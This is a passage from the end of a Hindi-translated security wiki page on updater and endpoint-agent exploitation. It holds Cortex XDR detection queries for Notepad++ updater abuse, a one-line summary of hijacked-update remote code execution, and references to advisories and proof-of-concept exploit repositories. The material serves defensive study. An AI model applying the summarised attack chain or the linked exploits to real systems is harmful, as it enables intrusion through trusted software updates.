| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> द्वारा गैर-Notepad++ installer लॉन्च करना</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

ये patterns किसी भी ऐसे updater पर लागू होते हैं जो unsigned manifests स्वीकार करता है या installer signers को pin करने में विफल रहता है—network hijack + malicious installer + BYO-signed sideloading से “trusted” updates की आड़ में remote code execution मिलता है।

---
## References
- [1] [Advisory – Windows के लिए Netskope Client – Rogue Server के ज़रिए Local Privilege Escalation (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre और Razer Synapse 4 पर Pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent में writable files के ज़रिए Local Privilege Escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent में Privilege escalation](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors द्वारा Notepad++ Supply Chain का Exploit](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident का अपडेट](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows के लिए Netskope Client में CVE-2025-0309 के fix को Bypass करना](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage में Privilege Escalation Bugs का पता लगाना](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
